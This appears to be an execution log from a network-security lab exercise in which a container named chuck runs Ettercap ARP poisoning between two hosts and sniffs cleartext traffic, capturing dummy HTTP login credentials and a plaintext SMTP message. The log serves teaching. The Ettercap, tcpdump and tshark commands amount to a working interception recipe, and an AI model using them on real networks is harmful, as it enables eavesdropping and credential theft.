+[Exercise 8: Bob logs into Alice over SSH]
+Node: bob
+Started: 2026-10-12T08:24:26+02:00
+Ended: 2026-10-12T08:24:26+02:00
+Command: sshpass -p alice ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 alice@10.92.2.10 'id -un'
+Exit status: 255
+--- stdout ---
+(empty)
+--- stderr ---
+Connection closed by 10.92.2.10 port 22
+
+====================================================================================================
+[Exercise 8: stop SSH packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:27+02:00
+Ended: 2026-10-12T08:24:27+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: decode visible SSH packet metadata]
+Node: chuck
+Started: 2026-10-12T08:24:28+02:00
+Ended: 2026-10-12T08:24:28+02:00
+Command: tshark -r /tmp/lab01_ssh.pcap -Y ssh -T fields -e frame.number -e ip.src -e ip.dst -e ssh.protocol -e ssh.message_code
+Exit status: 0
+--- stdout ---
+7	10.92.2.20	10.92.2.10	SSH-2.0-OpenSSH_10.5p1 Debian-1	
+16	10.92.2.10	10.92.2.20	SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4	
+20	10.92.2.20	10.92.2.10		20
+27	10.92.2.20	10.92.2.10		
+29	10.92.2.10	10.92.2.20		20
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: search capture strings for login secret]
+Node: chuck
+Started: 2026-10-12T08:24:28+02:00
+Ended: 2026-10-12T08:24:28+02:00
+Command: strings /tmp/lab01_ssh.pcap | grep -Ei 'alice|password' || true
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+sh: 1: strings: not found
+
+====================================================================================================
+[Exercise 8: SSH capture summary]
+Node: chuck
+Started: 2026-10-12T08:24:28+02:00
+Ended: 2026-10-12T08:24:28+02:00
+Command: cat /tmp/lab01_ssh_tcpdump.log; ls -lh /tmp/lab01_ssh.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+43 packets captured
+43 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 14K Oct 12 06:24 /tmp/lab01_ssh.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: stop direct Ettercap mode]
+Node: chuck
+Started: 2026-10-12T08:32:23+02:00
+Ended: 2026-10-12T08:32:23+02:00
+Command: sudo -n pkill -INT -x ettercap || true
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: reset neighbors before MITM retry]
+Node: alice
+Started: 2026-10-12T08:32:23+02:00
+Ended: 2026-10-12T08:32:23+02:00
+Command: ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: reset neighbors before MITM retry]
+Node: bob
+Started: 2026-10-12T08:32:23+02:00
+Ended: 2026-10-12T08:32:23+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: reset neighbors before MITM retry]
+Node: chuck
+Started: 2026-10-12T08:32:23+02:00
+Ended: 2026-10-12T08:32:24+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: launch container-compatible Ettercap]
+Node: chuck
+Started: 2026-10-12T08:32:24+02:00
+Ended: 2026-10-12T08:32:24+02:00
+Command: nohup labinf-ettercap -T -q -M arp /10.92.2.10// /10.92.2.20// >/tmp/lab01_ettercap3.log 2>&1 </dev/null & echo $!
+Exit status: 0
+--- stdout ---
+157
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: check Chuck packet offloads]
+Node: chuck
+Started: 2026-10-12T08:32:27+02:00
+Ended: 2026-10-12T08:32:27+02:00
+Command: ethtool -k eth0 | grep -E "generic-receive-offload|generic-segmentation-offload|tcp-segmentation-offload"
+Exit status: 0
+--- stdout ---
+tcp-segmentation-offload: off
+generic-segmentation-offload: off
+generic-receive-offload: off
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: begin SSH pcap retry]
+Node: chuck
+Started: 2026-10-12T08:32:27+02:00
+Ended: 2026-10-12T08:32:27+02:00
+Command: sudo -n rm -f /tmp/lab01_ssh3.pcap; nohup sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_ssh3.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 22 >/tmp/lab01_ssh3_tcpdump.log 2>&1 </dev/null & echo started
+Exit status: 0
+--- stdout ---
+started
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: Bob SSH login retry]
+Node: bob
+Started: 2026-10-12T08:32:28+02:00
+Ended: 2026-10-12T08:32:28+02:00
+Command: sshpass -p alice ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 alice@10.92.2.10 'id -un'
+Exit status: 255
+--- stdout ---
+(empty)
+--- stderr ---
+Connection reset by 10.92.2.10 port 22
+
+====================================================================================================
+[Exercise 8: stop SSH pcap retry]
+Node: chuck
+Started: 2026-10-12T08:32:29+02:00
+Ended: 2026-10-12T08:32:29+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: Ettercap retry diagnostics]
+Node: chuck
+Started: 2026-10-12T08:32:30+02:00
+Ended: 2026-10-12T08:32:30+02:00
+Command: tail -30 /tmp/lab01_ettercap3.log
+Exit status: 0
+--- stdout ---
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+
+/ |=========================>                         |  50.00 %
+- |==================================================>| 100.00 %
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.92.2.10 56:A4:FD:52:09:21
+
+ GROUP 2 : 10.92.2.20 C6:BA:77:67:44:4E
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+SEND L3 ERROR: 1724 byte packet (0800:06) destined to 10.92.2.10 was not forwarded (libnet_write_raw_ipv4(): -1 bytes written (Message too long))
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: SSH frame-size and retransmission details]
+Node: chuck
+Started: 2026-10-12T08:32:30+02:00
+Ended: 2026-10-12T08:32:30+02:00
+Command: tshark -r /tmp/lab01_ssh3.pcap -Y "tcp.port == 22" -T fields -e frame.number -e ip.src -e tcp.len -e tcp.analysis.retransmission
+Exit status: 0
+--- stdout ---
+1	10.92.2.20	0	
+2	10.92.2.20	0	1
+3	10.92.2.10	0	
+4	10.92.2.10	0	1
+5	10.92.2.20	0	
+6	10.92.2.20	0	
+7	10.92.2.20	33	
+8	10.92.2.20	33	1
+9	10.92.2.10	0	
+10	10.92.2.10	0	
+11	10.92.2.20	0	1
+12	10.92.2.10	0	1
+13	10.92.2.20	0	
+14	10.92.2.20	33	1
+15	10.92.2.10	0	
+16	10.92.2.10	41	
+17	10.92.2.10	41	1
+18	10.92.2.20	0	
+19	10.92.2.20	0	
+20	10.92.2.20	1672	
+21	10.92.2.20	1448	1
+22	10.92.2.20	224	1
+23	10.92.2.10	0	
+24	10.92.2.10	0	
+25	10.92.2.10	41	1
+26	10.92.2.20	0	
+27	10.92.2.20	224	
+28	10.92.2.10	0	
+29	10.92.2.10	1040	
+30	10.92.2.10	1040	1
+31	10.92.2.10	0	
+32	10.92.2.10	0	1
+33	10.92.2.10	1040	1
+34	10.92.2.20	1232	1
+35	10.92.2.20	1232	1
+36	10.92.2.10	0	
+37	10.92.2.10	0	
+38	10.92.2.10	0	1
+39	10.92.2.20	0	
+40	10.92.2.20	0	
+41	10.92.2.20	1232	1
+42	10.92.2.10	0	
+43	10.92.2.10	0	
+44	10.92.2.10	0	
+45	10.92.2.20	0	
+46	10.92.2.10	0	
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: alice
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: bob
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: chuck
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Alice]
+Node: alice
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: ping -c 1 -W 2 10.92.2.20; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.133 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.133/0.133/0.133/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.089 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.089/0.089/0.089/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   8a:c0:79:f1:1e:62   C                     eth0
+labinf-chuck-1.labinf_s  ether   de:f9:b8:62:4c:63   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Bob]
+Node: bob
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.097 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.097/0.097/0.097/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.090 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.090/0.090/0.090/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-alice-1.labinf_s  ether   26:67:cc:10:87:f1   C                     eth0
+labinf-chuck-1.labinf_s  ether   de:f9:b8:62:4c:63   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Chuck]
+Node: chuck
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.048 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.048 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-alice-1.labinf_s  ether   26:67:cc:10:87:f1   C                     eth0
+labinf-bob-1.labinf_sec  ether   8a:c0:79:f1:1e:62   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: start ARP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:42+02:00
+Ended: 2026-10-12T08:37:42+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_arp.pcap arp >/tmp/lab01_arp_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: start handout Ettercap ARP poisoning command]
+Node: chuck
+Started: 2026-10-12T08:37:43+02:00
+Ended: 2026-10-12T08:37:43+02:00
+Command: docker exec -d labinf-chuck-1 sh -c nohup labinf-ettercap -T -q -M arp /10.92.2.10// /10.92.2.20// >/tmp/lab01_ettercap.log 2>&1 </dev/null
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: Ettercap status and victim groups]
+Node: chuck
+Started: 2026-10-12T08:37:46+02:00
+Ended: 2026-10-12T08:37:47+02:00
+Command: cat /tmp/lab01_ettercap.log
+Exit status: 0
+--- stdout ---
+
+[1mettercap 0.8.4.1[0m copyright 2001-2026 Ettercap Development Team
+
+Listening on:
+  eth0 -> DE:F9:B8:62:4C:63
+	  10.92.2.30/255.255.255.0
+
+
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+
+/ |=========================>                         |  50.00 %
+- |==================================================>| 100.00 %
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.92.2.10 26:67:CC:10:87:F1
+
+ GROUP 2 : 10.92.2.20 8A:C0:79:F1:1E:62
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: verify Chuck forwarding and redirect settings]
+Node: chuck
+Started: 2026-10-12T08:37:47+02:00
+Ended: 2026-10-12T08:37:47+02:00
+Command: sysctl net.ipv4.ip_forward net.ipv4.conf.all.send_redirects net.ipv4.conf.default.send_redirects net.ipv4.conf.eth0.send_redirects
+Exit status: 0
+--- stdout ---
+net.ipv4.ip_forward = 1
+net.ipv4.conf.all.send_redirects = 0
+net.ipv4.conf.default.send_redirects = 0
+net.ipv4.conf.eth0.send_redirects = 0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: poisoned neighbor table on Bob]
+Node: bob
+Started: 2026-10-12T08:37:47+02:00
+Ended: 2026-10-12T08:37:48+02:00
+Command: ping -c 2 -W 2 10.92.2.10; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=0.084 ms
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=2.08 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=2.12 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=4.04 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=2 ttl=63 time=0.063 ms
+
+--- 10.92.2.10 ping statistics ---
+2 packets transmitted, 2 received, +3 duplicates, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 0.063/1.675/4.036/1.487 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-alice-1.labinf_s  ether   de:f9:b8:62:4c:63   C                     eth0
+labinf-chuck-1.labinf_s  ether   de:f9:b8:62:4c:63   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: poisoned neighbor table on Alice]
+Node: alice
+Started: 2026-10-12T08:37:48+02:00
+Ended: 2026-10-12T08:37:49+02:00
+Command: ping -c 2 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=0.122 ms
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=0.183 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=2.14 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=2.21 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=2 ttl=63 time=0.058 ms
+
+--- 10.92.2.20 ping statistics ---
+2 packets transmitted, 2 received, +3 duplicates, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 0.058/0.944/2.214/1.008 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   de:f9:b8:62:4c:63   C                     eth0
+labinf-chuck-1.labinf_s  ether   de:f9:b8:62:4c:63   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: stop ARP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:49+02:00
+Ended: 2026-10-12T08:37:49+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: decode captured ARP replies]
+Node: chuck
+Started: 2026-10-12T08:37:50+02:00
+Ended: 2026-10-12T08:37:50+02:00
+Command: tshark -r /tmp/lab01_arp.pcap -Y arp -T fields -e frame.time_relative -e eth.src -e arp.opcode -e arp.src.proto_ipv4 -e arp.src.hw_mac -e arp.dst.proto_ipv4
+Exit status: 0
+--- stdout ---
+0.000000000	de:f9:b8:62:4c:63	1	10.92.2.30	de:f9:b8:62:4c:63	10.92.2.10
+0.000033000	de:f9:b8:62:4c:63	1	10.92.2.30	de:f9:b8:62:4c:63	10.92.2.10
+0.000043000	26:67:cc:10:87:f1	2	10.92.2.10	26:67:cc:10:87:f1	10.92.2.30
+0.011767000	de:f9:b8:62:4c:63	1	10.92.2.30	de:f9:b8:62:4c:63	10.92.2.20
+0.011777000	de:f9:b8:62:4c:63	1	10.92.2.30	de:f9:b8:62:4c:63	10.92.2.20
+0.011780000	8a:c0:79:f1:1e:62	2	10.92.2.20	8a:c0:79:f1:1e:62	10.92.2.30
+1.024511000	de:f9:b8:62:4c:63	2	10.92.2.20	de:f9:b8:62:4c:63	10.92.2.10
+1.024552000	de:f9:b8:62:4c:63	2	10.92.2.10	de:f9:b8:62:4c:63	10.92.2.20
+2.036821000	de:f9:b8:62:4c:63	2	10.92.2.20	de:f9:b8:62:4c:63	10.92.2.10
+2.036842000	de:f9:b8:62:4c:63	2	10.92.2.10	de:f9:b8:62:4c:63	10.92.2.20
+3.048782000	de:f9:b8:62:4c:63	2	10.92.2.20	de:f9:b8:62:4c:63	10.92.2.10
+3.048793000	de:f9:b8:62:4c:63	2	10.92.2.10	de:f9:b8:62:4c:63	10.92.2.20
+4.060789000	de:f9:b8:62:4c:63	2	10.92.2.20	de:f9:b8:62:4c:63	10.92.2.10
+4.060816000	de:f9:b8:62:4c:63	2	10.92.2.10	de:f9:b8:62:4c:63	10.92.2.20
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: close ARP capture status]
+Node: chuck
+Started: 2026-10-12T08:37:50+02:00
+Ended: 2026-10-12T08:37:50+02:00
+Command: cat /tmp/lab01_arp_tcpdump.log
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+14 packets captured
+16 packets received by filter
+0 packets dropped by kernel
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: begin HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:50+02:00
+Ended: 2026-10-12T08:37:50+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_http.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 80 >/tmp/lab01_http_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: Bob submits dummy HTTP credentials]
+Node: bob
+Started: 2026-10-12T08:37:51+02:00
+Ended: 2026-10-12T08:37:51+02:00
+Command: curl -sS -i -X POST -d 'username=lab01_demo&password=Lab01Demo!' http://10.92.2.10/login.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:37:51 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "75d-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 1885
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Useful Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Useful Login</h2>
+        <form method="post">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: stop HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:52+02:00
+Ended: 2026-10-12T08:37:52+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: decode captured HTTP POST fields]
+Node: chuck
+Started: 2026-10-12T08:37:53+02:00
+Ended: 2026-10-12T08:37:54+02:00
+Command: tshark -r /tmp/lab01_http.pcap -Y http.request.method -T fields -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+Exit status: 0
+--- stdout ---
+0.001081000	10.92.2.20	10.92.2.10	POST	10.92.2.10	/login.html	username,password	lab01_demo,Lab01Demo!
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: show cleartext HTTP packet body]
+Node: chuck
+Started: 2026-10-12T08:37:54+02:00
+Ended: 2026-10-12T08:37:54+02:00
+Command: sudo -n tcpdump -nn -A -r /tmp/lab01_http.pcap 'tcp port 80' 2>/dev/null | grep -A6 -B3 'username=lab01_demo'
+Exit status: 0
+--- stdout ---
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:37:51.767735 IP 10.92.2.20.40790 > 10.92.2.10.80: Flags [P.], seq 1:194, ack 1, win 490, options [nop,nop,TS val 171171796 ecr 3724747992], length 193: HTTP: POST /login.html HTTP/1.1
+E.....@.?.i.
+\..
+\.
+.V.P......}............
+
+--
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:37:51.767832 IP 10.92.2.10.80 > 10.92.2.20.40790: Flags [.], ack 194, win 488, options [nop,nop,TS val 3724747993 ecr 171171796], length 0
+E..4D.@.@...
+\.
+
+\...P.V..}................
+..$.
+--
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:37:51.769928 IP 10.92.2.10.80 > 10.92.2.20.40790: Flags [.], ack 194, win 488, options [nop,nop,TS val 3724747993 ecr 171171796], length 0
+E..4D.@.@...
+\.
+
+\...P.V..}................
+..$.
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: packet capture summary]
+Node: chuck
+Started: 2026-10-12T08:37:54+02:00
+Ended: 2026-10-12T08:37:54+02:00
+Command: cat /tmp/lab01_http_tcpdump.log; ls -lh /tmp/lab01_http.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+30 packets captured
+30 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 9.3K Oct 12 06:37 /tmp/lab01_http.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: begin SMTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:54+02:00
+Ended: 2026-10-12T08:37:54+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_smtp.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 25 >/tmp/lab01_smtp_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: Bob sends plaintext SMTP message with s-nail]
+Node: bob
+Started: 2026-10-12T08:37:55+02:00
+Ended: 2026-10-12T08:37:55+02:00
+Command: s-nail -S 'mta=smtp://10.92.2.10' -S 'from=bob@kali' -s 'Esame di Sicurezza' alice@kali
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+s-nail: Obsoletion warning: Use of old-style credentials, which will vanish in v15!
+s-nail:   Please read the manual section "On URL syntax and credential lookup"
+
+====================================================================================================
+[Exercise 7: stop SMTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:57+02:00
+Ended: 2026-10-12T08:37:57+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: Alice reads received mailbox]
+Node: alice
+Started: 2026-10-12T08:37:58+02:00
+Ended: 2026-10-12T08:37:58+02:00
+Command: cat /var/mail/alice
+Exit status: 0
+--- stdout ---
+From bob@kali Mon Oct 12 06:37:55 2026
+Return-path: <bob@kali>
+Envelope-to: alice@kali
+Delivery-date: Mon, 12 Oct 2026 06:37:55 +0000
+Received: from labinf-bob-1.labinf_secnet ([10.92.2.20] helo=40fb2518fc83)
+	by 743625bce1ee with smtp (Exim 4.98.2)
+	(envelope-from <bob@kali>)
+	id 1xG9fX-0000000003F-1Rkd
+	for alice@kali;
+	Mon, 12 Oct 2026 06:37:55 +0000
+Date: Mon, 12 Oct 2026 06:37:55 +0000
+From: bob@kali
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012063755.xZOiL%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: show captured plaintext SMTP payload]
+Node: chuck
+Started: 2026-10-12T08:37:58+02:00
+Ended: 2026-10-12T08:37:58+02:00
+Command: sudo -n tcpdump -nn -A -r /tmp/lab01_smtp.pcap 'tcp port 25' 2>/dev/null | grep -A20 -B5 'carta di credito'
+Exit status: 0
+--- stdout ---
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012063755.xZOiL%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:37:55.397934 IP 10.92.2.20.57260 > 10.92.2.10.25: Flags [P.], seq 109:371, ack 211, win 490, options [nop,nop,TS val 171175427 ecr 3724751623], length 262: SMTP: From: bob@kali
+E..:|.@.?..M
+\..
+\.
+......|o.sS............
+
+3....3.From: bob@kali
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012063755.xZOiL%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:37:55.397944 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [.], ack 371, win 488, options [nop,nop,TS val 3724751623 ecr 171175427], length 0
+E..4..@.@.E.
+\.
+
+\.......sS...}u...........
+..3.
+3..
